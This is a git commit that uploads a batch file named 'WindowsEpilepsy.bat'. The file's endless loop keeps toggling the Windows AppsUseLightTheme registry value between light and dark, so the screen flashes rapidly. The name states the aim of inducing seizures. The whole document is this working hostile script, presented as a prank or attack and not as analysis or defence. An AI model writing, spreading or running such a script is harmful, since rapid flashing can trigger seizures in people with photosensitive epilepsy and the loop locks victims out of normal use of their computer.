bc48a39dfbeb8b6288d5e303843db8f5bf6707c4
BerBerOnGithub <86917016+BerBerOnGithub@users.noreply.github.com>
2021-08-07 15:02:08 +0200

    Add files via upload

---
+++ WindowsEpilepsy.bat
@@ -0,0 +1,4 @@
+:loop
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /v AppsUseLightTheme /t REG_DWORD /d 1 /f
+reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Themes\Personalize /v AppsUseLightTheme /t REG_DWORD /d 0 /f
+goto loop
